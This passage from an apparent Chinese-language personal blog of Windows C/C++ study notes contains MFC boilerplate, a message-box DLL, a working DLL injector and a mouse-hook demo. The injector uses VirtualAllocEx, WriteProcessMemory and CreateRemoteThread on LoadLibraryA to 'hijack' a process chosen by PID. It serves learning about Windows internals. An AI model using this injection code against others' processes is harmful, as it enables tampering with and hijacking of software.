InitCtrls.dwICC = ICC_WIN95_CLASSES; InitCommonControlsEx(&amp;InitCtrls); CWinApp::InitInstance(); AfxEnableControlContainer(); // 创建 shell 管理器，以防对话框包含 // 任何 shell 树视图控件或 shell 列表视图控件。 CShellManager *pShellManager = new CShellManager; // 激活“Windows Native”视觉管理器，以便在 MFC 控件中启用主题 CMFCVisualManager::SetDefaultManager(RUNTIME_CLASS(CMFCVisualManagerWindows)); // 标准初始化 // 如果未使用这些功能并希望减小 // 最终可执行文件的大小，则应移除下列 // 不需要的特定初始化例程 // 更改用于存储设置的注册表项 // TODO: 应适当修改该字符串， // 例如修改为公司或组织名 SetRegistryKey(_T(&quot;应用程序向导生成的本地应用程序&quot;)); CAutoRunImmunityDlg dlg; m_pMainWnd = &amp;dlg; INT_PTR nResponse = dlg.DoModal(); if (nResponse == IDOK) &#123; // TODO: 在此放置处理何时用 // “确定”来关闭对话框的代码 &#125; else if (nResponse == IDCANCEL) &#123; // TODO: 在此放置处理何时用 // “取消”来关闭对话框的代码 &#125; else if (nResponse == -1) &#123; TRACE(traceAppMsg, 0, &quot;警告: 对话框创建失败，应用程序将意外终止。\\n&quot;); TRACE(traceAppMsg, 0, &quot;警告: 如果您在对话框上使用 MFC 控件，则无法 #define _AFX_NO_MFC_CONTROLS_IN_DIALOGS。\\n&quot;); &#125; // 删除上面创建的 shell 管理器。 if (pShellManager != nullptr) &#123; delete pShellManager; &#125;#if !defined(_AFXDLL) &amp;&amp; !defined(_AFX_NO_MFC_CONTROLS_IN_DIALOGS) ControlBarCleanUp();#endif // 由于对话框已关闭，所以将返回 FALSE 以便退出应用程序， // 而不是启动应用程序的消息泵。 return FALSE;&#125; DLL注入 DLL_Helloworld 1234567891011121314151617181920212223242526272829303132333435363738394041424344// dllmain.cpp : 定义 DLL 应用程序的入口点。#include &quot;pch.h&quot;const int MaxLen = 0x50;//extern &quot;C&quot; __declspec(dllexport) //VOID MsgBox(wchar_t*szMsg)//&#123;// wchar_t szModuleName[MaxLen];// GetModuleFileName(NULL, szModuleName, MaxLen);// MessageBox(NULL,szMsg,szModuleName,MB_OK);//&#125;VOID MsgBox(wchar_t* szMsg)&#123; wchar_t szModuleName[MaxLen]; GetModuleFileName(NULL, szModuleName, MaxLen); MessageBoxW(NULL, szMsg, szModuleName, MB_OK);&#125;BOOL APIENTRY DllMain(HMODULE hModule, //DLL模块句柄 DWORD ul_reason_for_call,//被调用原因 LPVOID lpReserved //保留想，傻逼windows)//入口函数&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: &#123; MessageBoxA(NULL, &quot;HI&quot;, &quot;Attached&quot;, MB_OK); break; &#125; case DLL_THREAD_ATTACH: &#123; MsgBox((wchar_t*)&quot;Thread attached&quot;); break; &#125; case DLL_THREAD_DETACH: break; case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125; DLL注入 注入器 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#include &lt;iostream&gt;#include &lt;windows.h&gt;#include &lt;string&gt;#include &lt;cstring&gt;const int MaxLen = 0x50;using namespace std;int main()&#123; char DllPath[MaxLen]; DWORD PID; cout &lt;&lt; &quot;Which DLL To Load?\\n&quot;; cin &gt;&gt; DllPath; if (DllPath == NULL) cout &lt;&lt; &quot;This Dll Not exsits\\n&quot;; cout &lt;&lt; DllPath &lt;&lt; endl; //LoadLibraryA((LPCSTR)DllPath); cout &lt;&lt; &quot;Which Program want to hijack?\\n&quot;; cin &gt;&gt; PID; HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,PID); if (hProcess == NULL) &#123; cout &lt;&lt; &quot;This process is missing\\n&quot;; exit(-1); &#125; int DllLen = strlen(DllPath) + sizeof(char); PVOID pDllAddr = VirtualAllocEx( hProcess,NULL,DllLen,MEM_COMMIT,PAGE_READWRITE ); if (pDllAddr == NULL) &#123; CloseHandle(hProcess); cout &lt;&lt; &quot;Handle ERROR\\n&quot;; exit(-1); &#125; DWORD dwWriteNum = 0; cout &lt;&lt; &quot;Writting Mem\\n&quot;; WriteProcessMemory( hProcess, pDllAddr, DllPath, DllLen, &amp;dwWriteNum ); cout &lt;&lt; &quot;GetProcAddr\\n&quot;; FARPROC pFunAddr = GetProcAddress( GetModuleHandle((LPCWSTR)&quot;kernel32.dll&quot;), &quot;LoadLibraryA&quot; ); cout &lt;&lt; &quot;CreateRemoteThread\\n&quot;; HANDLE hThread = CreateRemoteThread( hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pFunAddr, pDllAddr, 0, NULL ); cout &lt;&lt; &quot;Close Handles\\n&quot;; WaitForSingleObject(hThread,INFINITE); CloseHandle(hThread); CloseHandle(hProcess);&#125; 待注入DLL 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106// Injector.cpp: 定义应用程序的类行为。//#include &quot;pch.h&quot;#include &quot;framework.h&quot;#include &quot;Injector.h&quot;#include &quot;InjectorDlg.h&quot;#ifdef _DEBUG#define new DEBUG_NEW#endif// CInjectorAppBEGIN_MESSAGE_MAP(CInjectorApp, CWinApp) ON_COMMAND(ID_HELP, &amp;CWinApp::OnHelp)END_MESSAGE_MAP()// CInjectorApp 构造CInjectorApp::CInjectorApp()&#123; // 支持重新启动管理器 m_dwRestartManagerSupportFlags = AFX_RESTART_MANAGER_SUPPORT_RESTART; // TODO: 在此处添加构造代码， // 将所有重要的初始化放置在 InitInstance 中&#125;// 唯一的 CInjectorApp 对象CInjectorApp theApp;// CInjectorApp 初始化BOOL CInjectorApp::InitInstance()&#123; // 如果一个运行在 Windows XP 上的应用程序清单指定要 // 使用 ComCtl32.dll 版本 6 或更高版本来启用可视化方式， //则需要 InitCommonControlsEx()。 否则，将无法创建窗口。 INITCOMMONCONTROLSEX InitCtrls; InitCtrls.dwSize = sizeof(InitCtrls); // 将它设置为包括所有要在应用程序中使用的 // 公共控件类。 InitCtrls.dwICC = ICC_WIN95_CLASSES; InitCommonControlsEx(&amp;InitCtrls); CWinApp::InitInstance(); AfxEnableControlContainer(); // 创建 shell 管理器，以防对话框包含 // 任何 shell 树视图控件或 shell 列表视图控件。 CShellManager *pShellManager = new CShellManager; // 激活“Windows Native”视觉管理器，以便在 MFC 控件中启用主题 CMFCVisualManager::SetDefaultManager(RUNTIME_CLASS(CMFCVisualManagerWindows)); // 标准初始化 // 如果未使用这些功能并希望减小 // 最终可执行文件的大小，则应移除下列 // 不需要的特定初始化例程 // 更改用于存储设置的注册表项 // TODO: 应适当修改该字符串， // 例如修改为公司或组织名 SetRegistryKey(_T(&quot;应用程序向导生成的本地应用程序&quot;)); CInjectorDlg dlg; m_pMainWnd = &amp;dlg; INT_PTR nResponse = dlg.DoModal(); if (nResponse == IDOK) &#123; // TODO: 在此放置处理何时用 // “确定”来关闭对话框的代码 &#125; else if (nResponse == IDCANCEL) &#123; // TODO: 在此放置处理何时用 // “取消”来关闭对话框的代码 &#125; else if (nResponse == -1) &#123; TRACE(traceAppMsg, 0, &quot;警告: 对话框创建失败，应用程序将意外终止。\\n&quot;); TRACE(traceAppMsg, 0, &quot;警告: 如果您在对话框上使用 MFC 控件，则无法 #define _AFX_NO_MFC_CONTROLS_IN_DIALOGS。\\n&quot;); &#125; // 删除上面创建的 shell 管理器。 if (pShellManager != nullptr) &#123; delete pShellManager; &#125;#if !defined(_AFXDLL) &amp;&amp; !defined(_AFX_NO_MFC_CONTROLS_IN_DIALOGS) ControlBarCleanUp();#endif // 由于对话框已关闭，所以将返回 FALSE 以便退出应用程序， // 而不是启动应用程序的消息泵。 return FALSE;&#125; Hook编程（进程Hook） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153#include &lt;windows.h&gt;LRESULT CALLBACK WindowProc( //CALLBACK 从右向左入栈 //LRESULT long //该函数处理窗口消息 HWND hWnd,//窗口句柄类型 UINT uMsg,//unsigned int, 消息 WPARAM wParam,//unsigned int LPARAM lParam //long int);HHOOK MouseHook;//鼠标钩子处理函数LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam);int WINAPI WinMain( //窗口应用GUI HINSTANCE hInstance, //当前程序的实例句柄 //HINSTANCE ：实例句柄类型 HINSTANCE hPreInstance, //为了兼容16位应用程序，永远为空 LPSTR lpCmdLine, //命令行参数 //LPSTR：char * int nCmdShow //窗口的显示方式)&#123; //1.做一个窗口 //1.1设计窗口类 Spy++ TCHAR szAppClassName[] = TEXT(&quot;Joe1sn&quot;);//自动适应字符集 WNDCLASS wndClass = &#123; 0 &#125;; wndClass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);//加载白色画刷 wndClass.hCursor = LoadCursor(NULL, IDC_ARROW);//加载光标 wndClass.hInstance = hInstance;//当前窗口实例句柄 wndClass.lpfnWndProc = WindowProc;//窗口处理函数 wndClass.lpszClassName = szAppClassName;//窗口类型 wndClass.style = CS_HREDRAW | CS_VREDRAW; //窗口类的风格 //1.2注册窗口类 RegisterClass(&amp;wndClass); //1.3创建窗口类 HWND hWnd = CreateWindow(szAppClassName, TEXT(&quot;Test&quot;), WS_BORDER | WS_CAPTION | WS_SYSMENU | WS_MAXIMIZEBOX | WS_MINIMIZEBOX, 500, 200, 800, 600, NULL, NULL, hInstance, NULL ); //1.4显示和更新窗口 ShowWindow(hWnd,SW_SHOW);//显示 UpdateWindow(hWnd);//更新窗口 //1.5消息循环 //（参考QT的信号和槽?） //应用程序-&gt;操作系统-&gt;消息队列-&gt;应用程序 MSG msg; while (GetMessage(&amp;msg,NULL,0,0))//所有消息都要获取 //WM_QIT，返回0，结束循环 &#123; //将虚拟键消息转为字符消息 //windows只能识别虚拟键值 VK_UP VK_DOWN TranslateMessage(&amp;msg); //将消息分发给窗口处理函数 //这里是WinProc DispatchMessage(&amp;msg); &#125; return 0;&#125;//鼠标钩子处理函数LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)&#123; //int x = LOWORD(lParam); //int y = HIWORD(lParam); //x += 100; //lParam = MAKELONG(x,y); /*if (wParam == VK_F2) &#123; SendMessage(hWnd, WM_CLOSE, 0, 0); UnhookWindowsHookW(MouseHook); &#125;*/ return CallNextHookEx(MouseHook,nCode,wParam,lParam);//向下传递 //return 1;//返回非0，表示消息已被处理，这样系统就不会把这个消息传递给程序&#125;LRESULT CALLBACK WindowProc(HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam)&#123; PAINTSTRUCT ps;// HDC hDC;//绘图DC switch (uMsg) &#123; //进程类hook case WM_CREATE://窗口创建消息 &#123; //安装hook MouseHook = SetWindowsHookEx(WH_MOUSE, MouseProc, NULL, GetCurrentThreadId()); break; &#125; case WM_CLOSE://窗口关闭消息 DestroyWindow(hWnd); break; case WM_DESTROY://窗口销毁消息 PostQuitMessage(0);//发送WM_QUIT就会退出 case WM_PAINT://窗口绘图消息 &#123; hDC = BeginPaint(hWnd, &amp;ps); HPEN hPen = CreatePen(PS_SOLID, 5, RGB(255, 0, 0)); SelectObject(hDC, hPen); Ellipse(hDC, 0, 0, 200, 200); EndPaint(hWnd, &amp;ps); &#125; case WM_LBUTTONDOWN://鼠标左键点击消息 &#123; MessageBox(hWnd, TEXT(&quot;Left&quot;), TEXT(&quot;Titile&quot;), MB_OK); break; &#125; case WM_RBUTTONDOWN://鼠标右键点击消息 &#123; MessageBox(hWnd, TEXT(&quot;Right&quot;), TEXT(&quot;Titile&quot;), MB_OK); break; &#125; case WM_MOUSEMOVE: &#123; int x = LOWORD(lParam); int y = HIWORD(lParam); wchar_t str[0x100]; wsprintf(str, L&quot;当前鼠标坐标(%d , %d)&quot;,x,y); //SetWindowText(hWnd, TEXT(&quot;In&quot;)); SetWindowText(hWnd, str); &#125; &#125; return DefWindowProc(hWnd, uMsg, wParam, lParam);&#125;","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"}],"tags":[{"name":"c/c++笔记","slug":"c-c-笔记","permalink":"https://joe1sn.eu.org/tags/c-c-%E7%AC%94%E8%AE%B0/"},{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/tags/notes/"}]}],"categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"},{"name":"kernel","slug":"notes/kernel","permalink":"https://joe1sn.eu.org/categories/notes/kernel/"},{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/categories/CVE/"},{"name":"java","slug":"notes/java","permalink":"https://joe1sn.eu.org/categories/notes/java/"}],"tags":[{"name":"kernel","slug":"kernel","permalink":"https://joe1sn.eu.org/tags/kernel/"},{"name":"windows","slug":"windows","permalink":"https://joe1sn.eu.org/tags/windows/"},{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/tags/notes/"},{"name":"git","slug":"git","permalink":"https://joe1sn.eu.org/tags/git/"},{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/tags/CVE/"},{"name":"fuzz","slug":"fuzz","permalink":"https://joe1sn.eu.org/tags/fuzz/"},{"name":"Java","slug":"Java","permalink":"https://joe1sn.eu.org/tags/Java/"},{"name":"c/c++笔记","slug":"c-c-笔记","permalink":"https://joe1sn.eu.org/tags/c-c-%E7%AC%94%E8%AE%B0/"}]}